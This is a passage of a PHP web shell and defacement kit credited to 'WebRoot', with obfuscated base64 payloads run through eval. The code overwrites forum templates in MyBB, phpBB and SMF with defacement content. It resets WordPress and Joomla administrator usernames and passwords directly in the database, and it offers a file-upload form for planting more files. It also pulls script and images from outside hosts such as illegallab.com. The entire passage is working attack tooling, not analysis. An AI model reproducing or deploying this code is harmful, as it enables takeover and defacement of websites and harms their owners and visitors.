9xdWVyeSgkbG9saTMpIG9yIGRpZSAobXlzcWxfZXJyb3IoKSk7IAplY2hvICI8c2NyaXB0PmFsZXJ0KCdWYiBIYWNrZWQnKTs8L3NjcmlwdD4iOyAKfSAKCi8vTXlCQiBIYWNrIAppZiAoaXNzZXQoJF9QT1NUWydteWJ1bGxldGluJ10pKSAKeyAKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPiAKPHRyPjx0ZD4gCjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz49PSBNeUJCIGluZGV4ZXIgPT08L2ZvbnQ+PC9jZW50ZXI+IAogICAgPGNlbnRlcj48Zm9ybSBtZXRob2Q9UE9TVCBhY3Rpb249Jyc+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5NeXNxbCBIb3N0PC9mb250Pjxicj48aW5wdXQgdHlwZT10ZXh0IG5hbWU9bXliYmRiaCB2YWx1ZT1sb2NhbGhvc3Qgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4gCiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRiS3VsbGFuaWNpPGJyPjwvZm9udD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9bXliYmRidSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+RGJhZGk8YnI+PC9mb250PjxpbnB1dCB0eXBlPXRleHQgbmFtZT1teWJiZGJuIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+IAogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EYnNpZnJlPGJyPjwvZm9udD48aW5wdXQgdHlwZT1wYXNzd29yZCBuYW1lPW15YmJkYnAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4gCiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPmluZGV4aW4gWWF6aWxhY2FnaSBCb2x1bTwvZm9udD48YnI+PHRleHRhcmVhIG5hbWU9bXliYmluZGV4IHJvd3M9JzE5JyBjb2xzPScxMDMnIHN0eWxlPSdjb2xvcjogIzAwMDAwMDsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+YnVyYXlhIGluZGV4aW5peiBnZWxlY2VrLj9uZGV4aSB5YXogcG9zdGFsYSBrYXkgZ2l0c2luLjwvdGV4dGFyZWE+PGJyPiAKICAgICAgICAgIDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nS2F5IEdpdHNpbiEnID48L2Zvcm0+PC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+PC9jZW50ZXI+IjsgCmRpZSgpOyAKfSAKJG15YmJfZGJoID0gJF9QT1NUWydteWJiZGJoJ107IAokbXliYl9kYnUgPSAkX1BPU1RbJ215YmJkYnUnXTsgCiRteWJiX2RibiA9ICRfUE9TVFsnbXliYmRibiddOyAKJG15YmJfZGJwID0gJF9QT1NUWydteWJiZGJwJ107IAokbXliYl9pbmRleCA9ICRfUE9TVFsnbXliYmluZGV4J107IAoKaWYgKCFlbXB0eSgkbXliYl9kYmgpICYmICFlbXB0eSgkbXliYl9kYnUpICYmICFlbXB0eSgkbXliYl9kYm4pICYmICFlbXB0eSgkbXliYl9pbmRleCkpIAp7IApteXNxbF9jb25uZWN0KCRteWJiX2RiaCwkbXliYl9kYnUsJG15YmJfZGJwKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7IApteXNxbF9zZWxlY3RfZGIoJG15YmJfZGJuKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7IAokcHJlZml4PSJteWJiXyI7IAokbG9saTcgPSAiVVBEQVRFICIuJHByZWZpeC4idGVtcGxhdGVzIFNFVCB0ZW1wbGF0ZT0nIi4kbXliYl9pbmRleC4iJyBXSEVSRSB0aXRsZT0naW5kZXgnIjsgCgokcmVzdWx0ID0gbXlzcWxfcXVlcnkoJGxvbGk3KSBvciBkaWUgKG15c3FsX2Vycm9yKCkpOyAKCmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ015QkIgSGFja2VkJyk7PC9zY3JpcHQ+IjsgCn0gCi8vUGhwQkIgCmlmIChpc3NldCgkX1BPU1RbJ3BocGJiJ10pKSAKeyAKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPiAKPHRyPjx0ZD4gCjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz49PSBQSFBCQiBpbmRleGVyID09PC9mb250PjwvY2VudGVyPiAKICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXBocGJiZGJoIHZhbHVlPWxvY2FsaG9zdCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+RGJLdWxsYW5pY2k8YnI+PC9mb250PjxpbnB1dCB0eXBlPXRleHQgbmFtZT1waHBiYmRidSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+RGJhZGk8YnI+PC9mb250PjxpbnB1dCB0eXBlPXRleHQgbmFtZT1waHBiYmRibiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+RGJzaWZyZTxicj48L2ZvbnQ+PGlucHV0IHR5cGU9cGFzc3dvcmQgbmFtZT1waHBiYmRicCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+WWF6aSBWZXlhICBLT0Q8YnI+PC9mb250PjxpbnB1dCB0eXBlPXRleHQgbmFtZT1waHBiYmthdCBzaXplPScxMDAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4gCiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRlZ2lzZWNlayBLQVRFR09SSSBJRCBzaTxicj48L2ZvbnQ+PGlucHV0IHR5cGU9dGV4dCBuYW1lPWthdGlkIHNpemU9JzEwMCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKICAgICAgICAgIDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nS2F5IEdpdHNpbiEnID48L2Zvcm0+PC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+PC9jZW50ZXI+IjsgCmRpZSgpOyAKfSAKJHBocGJiX2RiaCA9ICRfUE9TVFsncGhwYmJkYmgnXTsgCiRwaHBiYl9kYnUgPSAkX1BPU1RbJ3BocGJiZGJ1J107IAokcGhwYmJfZGJuID0gJF9QT1NUWydwaHBiYmRibiddOyAKJHBocGJiX2RicCA9ICRfUE9TVFsncGhwYmJkYnAnXTsgCiRwaHBiYl9rYXQgPSAkX1BPU1RbJ3BocGJia2F0J107IAoka2F0ZWdvcmlpZD0kX1BPU1RbJ2thdGlkJ107IAoKaWYgKCFlbXB0eSgkcGhwYmJfZGJoKSAmJiAhZW1wdHkoJHBocGJiX2RidSkgJiYgIWVtcHR5KCRwaHBiYl9kYm4pICYmICFlbXB0eSgkcGhwYmJfa2F0KSkgCnsgCm15c3FsX2Nvbm5lY3QoJHBocGJiX2RiaCwkcGhwYmJfZGJ1LCRwaHBiYl9kYnApIG9yIGRpZShteXNxbF9lcnJvcigpKTsgCm15c3FsX3NlbGVjdF9kYigkcGhwYmJfZGJuKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7IAoKCiRsb2xpMTAgPSAiVVBEQVRFIHBocGJiX2NhdGVnb3JpZXMgIFNFVCBjYXRfdGl0bGU9JyIuJHBocGJiX2thdC4iJyBXSEVSRSBjYXRfaWQ9JyIuJGthdGVnb3JpaWQuIiciOyAKCiRyZXN1bHQgPSBteXNxbF9xdWVyeSgkbG9saTEwKSBvciBkaWUgKG15c3FsX2Vycm9yKCkpOyAKCmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1BocEJCIEhhY2tlZCcpOzwvc2NyaXB0PiI7IAp9IAovL1NtZkhBQ0sgCmlmIChpc3NldCgkX1BPU1RbJ3NtZiddKSkgCnsgCmVjaG8gIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0wIHdpZHRoPScxMDAlJz4gCjx0cj48dGQ+IAo8Y2VudGVyPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+PT0gU01GIEluZGV4ZXIgPT08L2ZvbnQ+PC9jZW50ZXI+IAogICAgPGNlbnRlcj48Zm9ybSBtZXRob2Q9UE9TVCBhY3Rpb249Jyc+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5NeXNxbCBIb3N0PC9mb250Pjxicj48aW5wdXQgdHlwZT10ZXh0IG5hbWU9c21mZGJoIHZhbHVlPWxvY2FsaG9zdCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+RGJLdWxsYW5pY2k8YnI+PC9mb250PjxpbnB1dCB0eXBlPXRleHQgbmFtZT1zbWZkYnUgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4gCiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRiYWRpPGJyPjwvZm9udD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9c21mZGJuIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+IAogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EYnNpZnJlPGJyPjwvZm9udD48aW5wdXQgdHlwZT1wYXNzd29yZCBuYW1lPXNtZmRicCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKICAgICAgICAgICAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPllhemkgWWFkYSBLT0Q8YnI+PC9mb250PjxpbnB1dCB0eXBlPXRleHQgbmFtZT1zbWZfaW5kZXggc2l6ZT0nMTAwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+IAogICAgICAgICAgICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+RGVnaXNlY2VrIEtBVEVHT1JJIElEIHNpIDxicj48L2ZvbnQ+PGlucHV0IHR5cGU9dGV4dCBuYW1lPWthdGlkIHNpemU9JzEwMCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKCiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0theSBHaXRzaW4hJyA+PC9mb3JtPjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiI7IApkaWUoKTsgCn0gCiRzbWZfZGJoID0gJF9QT1NUWydzbWZkYmgnXTsgCiRzbWZfZGJ1ID0gJF9QT1NUWydzbWZkYnUnXTsgCiRzbWZfZGJuID0gJF9QT1NUWydzbWZkYm4nXTsgCiRzbWZfZGJwID0gJF9QT1NUWydzbWZkYnAnXTsgCiRzbWZfaW5kZXggPSAkX1BPU1RbJ3NtZl9pbmRleCddOyAKJHNtZl9rYXRpZD0kX1BPU1RbJ2thdGlkJ107IAoKaWYgKCFlbXB0eSgkc21mX2RiaCkgJiYgIWVtcHR5KCRzbWZfZGJ1KSAmJiAhZW1wdHkoJHNtZl9kYm4pICYmICFlbXB0eSgkc21mX2luZGV4KSkgCnsgCm15c3FsX2Nvbm5lY3QoJHNtZl9kYmgsJHNtZl9kYnUsJHNtZl9kYnApIG9yIGRpZShteXNxbF9lcnJvcigpKTsgCm15c3FsX3NlbGVjdF9kYigkc21mX2Ribikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAKJHByZWZpeD0ic21mXyI7IAokbG9saTEyID0gIlVQREFURSAiLiRwcmVmaXguImNhdGVnb3JpZXMgU0VUIG5hbWU9JyIuJHNtZl9pbmRleC4iJyBXSEVSRSBJRF9DQVQ9JyIuJHNtZl9rYXRpZC4iJyI7IAoKJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCRsb2xpMTIpIG9yIGRpZSAobXlzcWxfZXJyb3IoKSk7IAoKZWNobyAiPHNjcmlwdD5hbGVydCgnc21mIEhhY2tlZCcpOzwvc2NyaXB0PiI7IAp9IAoKCi8vQWx0IHRhcmFmIAplY2hvICIgCgoKPGJyPjx0YWJsZSB3aWR0aD0nMTAwJScgaGVpZ2h0PScxJyBib3JkZXI9JzEnIGNlbGxQYWRkaW5nPTUgY2VsbFNwYWNpbmc9MCBib3JkZXJDb2xvckRhcms9IzY2NjY2NiBpZD0ndGFibGUxJyBzdHlsZT0nQk9SREVSLUNPTExBUFNFOiBjb2xsYXBzZSc+IAo8dHI+IAo8dGQgd2lkdGg9JzI1JScgaGVpZ2h0PScxJyB2YWxpZ249J3RvcCcgc3R5bGU9J2ZvbnQtZmFtaWx5OiB2ZXJkYW5hOyBjb2xvcjogIzAwMDAwMDsgZm9udC1zaXplOiAxMXB4Jz4gCiAgPGNlbnRlcj48cD48c3Ryb25nPjxoMj5FZGl0ZWQgQnkgV2ViUm9vVDwvc3Ryb25nPjwvcD48L2gyPjwvY2VudGVyPgogIDxjZW50ZXI+PHA+PHN0cm9uZz4uLjo6IGluZGV4ZXIgVjIuMCA6Oi4uPC9zdHJvbmc+PC9wPjwvY2VudGVyPgo8cD48c3Ryb25nPjwvc3Ryb25nPjxicj4gCjwvcD48ZGl2IGFsaWduPSJjZW50ZXIiPjxpbWcgIGFsaWduPSJjZW50ZXIiIHN0eWxlPSJ3aWR0aDoxMDA7IGhlaWdodDoxMDBweCA7IiBzcmM9Imh0dHA6Ly9yb290a2l0bmluamEuY29tL2ltYWdlcy9kZXZpbC5qcGc/cj0iPD89cmFuZCgwLDE2MDAwKTs/PjwvZGl2Pgo8L3RkPiAKPC90cj48L3RhYmxlPiI7IAoKCgovLyBLb2QgYml0aXNpIAo/PiA=';
            $IIIIIIIllIlI = fopen('index.php', 'w+');
            $IIIIIIIllIll = fwrite($IIIIIIIllIlI, base64_decode($IIIIIIIlllII));
            fclose($IIIIIIIllIlI);
            echo '<iframe src=indexer/index.php width=100% height=620px frameborder=0></iframe> ';
        break;
        case 'wp':
            echo '<img src=http://oi61.tinypic.com/ng9co9.jpg>';
            eval(base64_decode('aWYoZW1wdHkoJF9QT1NUWydwd2QnXSkpewplY2hvICI8Rk9STSBtZXRob2Q9XCJQT1NUXCI+Cmhv
c3QgOiA8SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9XCJsb2NhbGhvc3RcIiBuYW1lPVwibG9jYWxo
b3N0XCIgdHlwZT1cInRleHRcIj4KZGF0YWJhc2UgOiA8SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9
XCJ3cC1cIiBuYW1lPVwiZGF0YWJhc2VcIiB0eXBlPVwidGV4dFwiPjxicj4KdXNlcm5hbWUgOiA8
SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9XCJ3cC1cIiBuYW1lPVwidXNlcm5hbWVcIiB0eXBlPVwi
dGV4dFwiPgpwYXNzd29yZCA6IDxJTlBVVCBzaXplPVwiMTVcIiB2YWx1ZT1cIioqXCIgbmFtZT1c
InBhc3N3b3JkXCIgdHlwZT1cInBhc3N3b3JkXCI+PGJyPgogIDxicj4KU2V0IEEgTmV3IHVzZXJu
YW1lIDQgTG9naW4gOiA8SU5QVVQgbmFtZT1cImFkbWluXCIgc2l6ZT1cIjE1XCIgdmFsdWU9XCJh
ZG1pblwiPjxicj4KU2V0IEEgTmV3IHBhc3N3b3JkIDQgTG9naW4gOiA8SU5QVVQgbmFtZT1cInB3
ZFwiIHNpemU9XCIxNVwiIHZhbHVlPVwiMTIzNDU2XCI+PGJyPgoKPElOUFVUIHZhbHVlPVwiY2hh
bmdlXCIgbmFtZT1cInNlbmRcIiB0eXBlPVwic3VibWl0XCI+CjwvRk9STT4iOwp9ZWxzZXsKJGxv
Y2FsaG9zdCA9ICRfUE9TVFsnbG9jYWxob3N0J107CiRkYXRhYmFzZSAgPSAkX1BPU1RbJ2RhdGFi
YXNlJ107CiR1c2VybmFtZSAgPSAkX1BPU1RbJ3VzZXJuYW1lJ107CiRwYXNzd29yZCAgPSAkX1BP
U1RbJ3Bhc3N3b3JkJ107CiRwd2QgICA9ICRfUE9TVFsncHdkJ107CiRhZG1pbiA9ICRfUE9TVFsn
YWRtaW4nXTsKCgogQG15c3FsX2Nvbm5lY3QoJGxvY2FsaG9zdCwkdXNlcm5hbWUsJHBhc3N3b3Jk
KSBvciBkaWUobXlzcWxfZXJyb3IoKSk7CiBAbXlzcWxfc2VsZWN0X2RiKCRkYXRhYmFzZSkgb3Ig
ZGllKG15c3FsX2Vycm9yKCkpOwoKJGhhc2ggPSBjcnlwdCgkcHdkKTsKJGE0cz1AbXlzcWxfcXVl
cnkoIlVQREFURSB3cF91c2VycyBTRVQgdXNlcl9sb2dpbiA9JyIuJGFkbWluLiInIFdIRVJFIElE
ID0gMSIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsKJGE0cz1AbXlzcWxfcXVlcnkoIlVQREFURSB3
cF91c2VycyBTRVQgdXNlcl9wYXNzID0nIi4kaGFzaC4iJyBXSEVSRSBJRCA9IDEiKSBvciBkaWUo
bXlzcWxfZXJyb3IoKSk7CiRhNHM9QG15c3FsX3F1ZXJ5KCJVUERBVEUgd3BfdXNlcnMgU0VUIHVz
ZXJfbG9naW4gPSciLiRhZG1pbi4iJyBXSEVSRSBJRCA9IDIiKSBvciBkaWUobXlzcWxfZXJyb3Io
KSk7CiRhNHM9QG15c3FsX3F1ZXJ5KCJVUERBVEUgd3BfdXNlcnMgU0VUIHVzZXJfcGFzcyA9JyIu
JGhhc2guIicgV0hFUkUgSUQgPSAyIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOwokYTRzPUBteXNx
bF9xdWVyeSgiVVBEQVRFIHdwX3VzZXJzIFNFVCB1c2VyX2xvZ2luID0nIi4kYWRtaW4uIicgV0hF
UkUgSUQgPSAzIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOwokYTRzPUBteXNxbF9xdWVyeSgiVVBE
QVRFIHdwX3VzZXJzIFNFVCB1c2VyX3Bhc3MgPSciLiRoYXNoLiInIFdIRVJFIElEID0gMyIpIG9y
IGRpZShteXNxbF9lcnJvcigpKTsKJGE0cz1AbXlzcWxfcXVlcnkoIlVQREFURSB3cF91c2VycyBT
RVQgdXNlcl9lbWFpbCA9JyIuJFNRTC4iJyBXSEVSRSBJRCA9IDEiKSBvciBkaWUobXlzcWxfZXJy
b3IoKSk7CgoKaWYoJGE0cyl7CmVjaG8gIjxiPiBTdWNjZXNzIDpOb3cgVXNlIEEgTmV3IFVzZXIg
QW5kIFBhc3MgVG8gbG9naW4gSW4gVGhlIEFkbWluIFBhbmVsPC9iPiAiOwp9Cgp9'));
        break;
        case 'joom':
            echo '<img src=http://oi61.tinypic.com/ng9co9.jpg>';
            eval(base64_decode('aWYoZW1wdHkoJF9QT1NUWydwd2QnXSkpewplY2hvICI8Rk9STSBtZXRob2Q9XCJQT1NUXCI+Cmhv
c3QgOiA8SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9XCJsb2NhbGhvc3RcIiBuYW1lPVwibG9jYWxo
b3N0XCIgdHlwZT1cInRleHRcIj4KZGF0YWJhc2UgOiA8SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9
XCJkYXRhYmFzZVwiIG5hbWU9XCJkYXRhYmFzZVwiIHR5cGU9XCJ0ZXh0XCI+PGJyPgp1c2VybmFt
ZSA6IDxJTlBVVCBzaXplPVwiMTVcIiB2YWx1ZT1cImRiX3VzZXJcIiBuYW1lPVwidXNlcm5hbWVc
IiB0eXBlPVwidGV4dFwiPgpwYXNzd29yZCA6IDxJTlBVVCBzaXplPVwiMTVcIiB2YWx1ZT1cIioq
XCIgbmFtZT1cInBhc3N3b3JkXCIgdHlwZT1cInBhc3N3b3JkXCI+PGJyPgogIDxicj4KU2V0IEEg
TmV3IHVzZXJuYW1lIEZvciBMb2dpbiA6IDxJTlBVVCBuYW1lPVwiYWRtaW5cIiBzaXplPVwiMTVc
IiB2YWx1ZT1cImFkbWluXCI+PGJyPgpEb25gdCBDaGFuZ2UgaXQgUGFzc3dvcmQgaXMgOiAxMjM0
NTY6IDxJTlBVVCBuYW1lPVwicHdkXCIgc2l6ZT1cIjE1XCIgdmFsdWU9XCJlMTBhZGMzOTQ5YmE1
OWFiYmU1NmUwNTdmMjBmODgzZVwiPjxicj4KCjxJTlBVVCB2YWx1ZT1cImNoYW5nZVwiIG5hbWU9
XCJzZW5kXCIgdHlwZT1cInN1Ym1pdFwiPgo8L0ZPUk0+IjsKfWVsc2V7CiRsb2NhbGhvc3QgPSAk
X1BPU1RbJ2xvY2FsaG9zdCddOwokZGF0YWJhc2UgID0gJF9QT1NUWydkYXRhYmFzZSddOwokdXNl
cm5hbWUgID0gJF9QT1NUWyd1c2VybmFtZSddOwokcGFzc3dvcmQgID0gJF9QT1NUWydwYXNzd29y
ZCddOwokcHdkICAgPSAkX1BPU1RbJ3B3ZCddOwokYWRtaW4gPSAkX1BPU1RbJ2FkbWluJ107CkBt
eXNxbF9jb25uZWN0KCRsb2NhbGhvc3QsJHVzZXJuYW1lLCRwYXNzd29yZCkgb3IgZGllKG15c3Fs
X2Vycm9yKCkpOwpAbXlzcWxfc2VsZWN0X2RiKCRkYXRhYmFzZSkgb3IgZGllKG15c3FsX2Vycm9y
KCkpOwokaGFzaCA9IGNyeXB0KCRwd2QpOwokU1FMPUBteXNxbF9xdWVyeSgiVVBEQVRFIGpvc191
c2VycyBTRVQgdXNlcm5hbWUgPSciLiRhZG1pbi4iJyBXSEVSRSBJRCA9IDYyIikgb3IgZGllKG15
c3FsX2Vycm9yKCkpOwokU1FMPUBteXNxbF9xdWVyeSgiVVBEQVRFIGpvc191c2VycyBTRVQgcGFz
c3dvcmQgPSciLiRwd2QuIicgV0hFUkUgSUQgPSA2MiIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsK
JFNRTD1AbXlzcWxfcXVlcnkoIlVQREFURSBqb3NfdXNlcnMgU0VUIHVzZXJuYW1lID0nIi4kYWRt
aW4uIicgV0hFUkUgSUQgPSA2MyIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsKJFNRTD1AbXlzcWxf
cXVlcnkoIlVQREFURSBqb3NfdXNlcnMgU0VUIHBhc3N3b3JkID0nIi4kcHdkLiInIFdIRVJFIElE
ID0gNjMiKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7CiRTUUw9QG15c3FsX3F1ZXJ5KCJVUERBVEUg
am9zX3VzZXJzIFNFVCB1c2VybmFtZSA9JyIuJGFkbWluLiInIFdIRVJFIElEID0gNjQiKSBvciBk
aWUobXlzcWxfZXJyb3IoKSk7CiRTUUw9QG15c3FsX3F1ZXJ5KCJVUERBVEUgam9zX3VzZXJzIFNF
VCBwYXNzd29yZCA9JyIuJHB3ZC4iJyBXSEVSRSBJRCA9IDY0Iikgb3IgZGllKG15c3FsX2Vycm9y
KCkpOwokU1FMPUBteXNxbF9xdWVyeSgiVVBEQVRFIGpvc191c2VycyBTRVQgdXNlcm5hbWUgPSci
LiRhZG1pbi4iJyBXSEVSRSBJRCA9IDY1Iikgb3IgZGllKG15c3FsX2Vycm9yKCkpOwokU1FMPUBt
eXNxbF9xdWVyeSgiVVBEQVRFIGpvc191c2VycyBTRVQgcGFzc3dvcmQgPSciLiRwd2QuIicgV0hF
UkUgSUQgPSA2NSIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsKaWYoJFNRTCl7CmVjaG8gIjxiPlN1
Y2Nlc3MgOk5vdyBVc2UgQSBOZXcgVXNlciBBbmQgUGFzc3dvcmQgLSAoMTIzNDU2KSI7Cn0KfQ==
'));
        break;
        default:
            header("Location: $IIIIIIIIIlll");
    }
} else {
    echo '<img src=http://oi61.tinypic.com/ng9co9.jpg>';
    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" value="Choose file" size="60" ><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
    if ($_POST['_upl'] == 'Upload') {
        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            echo '<br /><br /><b>Upload basarili :)<br><br>';
        } else {
            echo '<br /><br />Upload basarisiz :(<br><br>';
        }
    }
    echo '
<br /><br /><div class="fot">Coded by WebRoot
<br /><br />
 ';
};
echo '

</div>


</body>
<div align="center"><img style="width:100; height:100px ;" src="https://illegallab.com/images/devil.jpg?r=<?=rand(0,16000);?>"> </div>
<SCRIPT SRC=https://illegallab.com/say.js>></SCRIPT>
</html>
';;